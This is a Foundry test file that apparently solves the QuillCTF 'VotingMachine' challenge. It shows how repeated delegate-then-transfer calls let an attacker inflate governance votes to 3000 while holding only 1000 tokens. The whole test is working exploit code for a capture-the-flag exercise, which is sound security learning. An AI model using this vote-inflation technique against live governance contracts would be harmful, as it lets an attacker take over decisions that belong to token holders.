// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import {VoteToken} from "../../src/QuillCTF/VotingMachine.sol";

contract VotingMachineTest is Test {
    VoteToken public voteToken;
    address public victim1;
    address public victim2;
    address public victim3;    
    address public deployer;
    address public attacker;

    function setUp() public {
        victim1 = vm.addr(1);
        victim2 = vm.addr(2);
        victim3 = vm.addr(3);
        deployer = vm.addr(4);
        attacker = vm.addr(5);

        vm.startPrank(deployer);
        voteToken = new VoteToken();
        voteToken.mint(victim1, 1000);
        vm.stopPrank();
    }

    function testVotingMachineExploit() public {
        // Before Exploit
        assertEq(voteToken.getVotes(attacker), 0);
        assertEq(voteToken.balanceOf(attacker), 0);

        // Exploit
        vm.startPrank(victim1);
        voteToken.delegate(attacker);
        voteToken.transfer(victim2, 1000);
        vm.stopPrank();

        vm.startPrank(victim2);
        voteToken.delegate(attacker);
        voteToken.transfer(victim3, 1000);
        vm.stopPrank();

        vm.startPrank(victim3);
        voteToken.delegate(attacker);
        voteToken.transfer(attacker, 1000);
        vm.stopPrank();

        // After Exploit
        assertEq(voteToken.getVotes(attacker), 3000);
        assertEq(voteToken.balanceOf(attacker), 1000);
    }
}